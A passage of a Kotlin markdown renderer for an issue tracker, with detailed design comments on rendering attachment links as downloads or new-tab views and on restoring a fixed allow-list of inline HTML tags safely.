 * treatment. The shape itself is [ApiRoutes.isAttachmentId], in the shared
 * module, so this and the server agree on it by construction; that check used to
 * be "all digits" here and had to change when the id stopped being a row id
 * (LNL-51).
 *
 * `startsWith` rather than a [Regex] built from the prefix, because building one
 * would mean escaping the prefix into a pattern, and this file has already been
 * bitten once by a regex that was legal on the JVM and a SyntaxError in the
 * browser — see [renderImages]. There is no pattern here to be wrong.
 *
 * A user can of course type this URL by hand into a link and get a download
 * affordance for a file that is not theirs. It costs nothing: the route answers
 * 404 to a reader who cannot see the owning project, so the affordance is a lie
 * the server immediately corrects — and since LNL-51 they have no id to type,
 * which is the point of that change rather than a bonus from it.
 */
private fun isAttachmentUrl(url: String): Boolean {
    if (!url.startsWith(ApiRoutes.ATTACHMENT_PREFIX)) return false
    val id = url.removePrefix(ApiRoutes.ATTACHMENT_PREFIX).removeSuffix(ApiRoutes.ATTACHMENT_VIEW_SUFFIX)
    return ApiRoutes.isAttachmentId(id)
}

/**
 * Is this attachment link one to open rather than one to save?
 *
 * Only ever asked of a URL [isAttachmentUrl] has already agreed to, so the
 * suffix is the entire question — the digits in front of it are checked there.
 * The renderer cannot know an attachment's type (markdown carries a URL and a
 * label, and nothing else), which is why the *uploader* encodes the answer in
 * the URL it writes. See attachmentMarkdown.
 */
private fun isViewableAttachmentUrl(url: String): Boolean = url.endsWith(ApiRoutes.ATTACHMENT_VIEW_SUFFIX)

/**
 * `[report.pdf (2.3 MB)](/api/attachments/12)` → a download.
 *
 * ── Why the renderer draws this and not the editor ──────────────────────────
 *
 * Because the stored document must stay markdown, and markdown has one spelling
 * for a link. There is no `[x](url){.attachment}` here, and inventing one would
 * mean the serialiser has to emit it and this file has to parse it — two new
 * things to get wrong, to express something the URL already says. So the
 * markdown is an ordinary link and *this* function decides how it looks, from
 * the URL alone. The serialiser reads the `href` back out and emits the same
 * ordinary link, and the round-trip is closed without either side knowing that
 * attachments exist. See MarkdownSerialiser.kt.
 *
 * `download` rather than `target="_blank"`: this URL answers with
 * `Content-Disposition: attachment`, so a new tab would open, download, and shut
 * again — a flash of nothing that reads as a broken link. The attribute has no
 * value, deliberately. Given one, it would name the saved file, and the only
 * name available here is the label, which by then also carries "(2.3 MB)"; bare,
 * the browser takes the filename from the header, which is the real one.
 *
 * The `/view` spelling is the exception, and it inverts both halves of that: it
 * answers with `Content-Disposition: inline`, so it *is* a page, and `download`
 * on it would save the report the reader asked to read. It gets the same
 * `target="_blank"` an ordinary external link gets, and for the same reason —
 * the issue you were reading should still be behind it when you close the tab.
 * `rel` stays either way; see renderLinks for what it is holding shut.
 *
 * The class is what the CSS hangs the icon and the box off — a download does not
 * look like a link, because clicking it does not do what a link does. There is
 * no user text in either attribute, so there is nothing here to escape that
 * [escapeHtml] has not already dealt with; the URL is a fixed prefix and digits
 * by the time [isAttachmentUrl] has agreed to this path.
 */
private fun attachmentLink(url: String, label: String): String {
    val behaviour = if (isViewableAttachmentUrl(url)) "target=\"_blank\"" else "download"
    return "<a href=\"$url\" class=\"attachment\" $behaviour rel=\"noopener noreferrer\">$label</a>"
}

/**
 * Turn the escaped `&lt;u&gt;` back into a real `<u>`.
 *
 * This is the *only* path by which a tag from the source document reaches the
 * output, and it is an exact-match substitution on a fixed list rather than
 * anything that parses. `<u foo="bar">` does not match and stays escaped, which
 * is the point: there is no attribute to smuggle a handler into, because there
 * is no attribute at all.
 */
private fun restoreAllowedTags(text: String): String {
    var out = text
    ALLOWED_INLINE_TAGS.forEach { tag ->
        out = out.replace("&lt;$tag&gt;", "<$tag>").replace("&lt;/$tag&gt;", "</$tag>")
    }
    return out
}
